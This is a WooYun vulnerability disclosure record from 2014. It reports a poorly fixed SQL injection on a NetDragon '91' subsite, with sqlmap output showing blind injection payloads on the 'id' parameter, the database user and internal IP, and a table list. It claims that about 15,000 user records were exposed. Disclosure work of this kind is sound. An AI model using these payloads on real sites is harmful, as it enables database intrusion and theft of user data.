{"id": 5093, "wybug_id": "wooyun-2014-051284", "wybug_title": "91某分站一个修复不完善的SQL注射导致上万用户数据再次面临泄露", "wybug_corp": "福建网龙", "wybug_author": "niliu", "wybug_date": "2014-02-18 14:03", "wybug_open_date": "2014-04-04 14:03", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-04：\t细节向公众公开  简要描述： 91某分站一个修复不完善的SQL注射,上万用户数据泄露 详细说明：  url：\n\n修复不完善啊\n---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=287 AND 5004=5004    Vector: AND [INFERENCE]    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=287 AND SLEEP(5)    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])\n数据库信息\nweb application technology: Nginxback-end DBMS: MySQL 5.0.11current user:    'mmh@10.1.240.59'current database:    'mmh'\n库\navailable databases [3]:[*] information_schema[*] mmh[*] test\n\n\n\n\n表\nTable Name\tColumnsweibo_topic_link\tweibo_topic\ttopic\tthridpart_user\ttags\tsettings\tseo_settings\treply\tmood\tmmh_video\tmmh_userview\tmmh_user\tmmh_special\tmmh_slide\tmmh_master\tmmh_link\tmmh_info\tmmh_gbook\tmmh_comment\tmmh_co_urls\tmmh_co_node\tmmh_co_content\tmmh_co_channel\tmmh_channel\tmmh_agegroup\tmmh_adsense\tmessages\tmemberex\tmember\tmagicapp_app_active_log_201210\tmagicapp_app_active_log\tlog_tmp\tlog_201210\tlog_201208\tlog_201207\tlog\tlikes\tfollow\texpression\tdiybooks_items\tdiyapp_app_active_log_201210\tdiyapp_app_active_log\tcredit_user\tcredit_type\tcredit_setting\tblog\tbaby\tattachments\tarea\tapplication\tapp_tags\tapp_items_promote\tapp_items\tapp_item_details\tapp_item_comments\tapp_item_collect\tapp_feedback\tapp_active_log_tmp\tapp_active_log_201212\tapp_active_log_201211\tapp_active_log_201210\tapp_active_log_201209\tapp_active_log_201208\tapp_active_log_201207\tapp_active_log\tadvertisement\tadmin_node\tactivity\t91war_app_active_log\n\n\n管理员密码\n\n用户数据，14892条，包括用户名， 密码，邮箱，密保，登陆IP等等。\n\n   漏洞证明：  如上   修复方案：  过滤啊~有礼物么 ：）   版权声明：转载请注明来源 niliu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-02-18 15:54 厂商回复： 感谢 niliu 提交的漏洞，此漏洞正安排处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-18 14:08 |    \t\tHuc-Unis \t\t\t( 普通白帽子  |\t\t\t        Rank:1055 漏洞数:292        | 诶，现在通用奖励越来越低了；离买保时捷卡...)\t\t \n  吓得我都坐地上了！    \n     2014-02-18 14:09 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  吓得我都跳起来了！    \n     2014-02-18 14:34 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @niliu 求大神别对air出手    \n     2014-02-18 15:04 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @小川 我wb不够，刷啊赶紧    \n     2014-02-18 15:26 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  @小川 意思你准备入了？    \n     2014-02-18 16:38 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @Mr.leo 如果你们不抢的话    \n     2014-02-18 17:21 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  @小川 我明确表示不敢兴趣    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}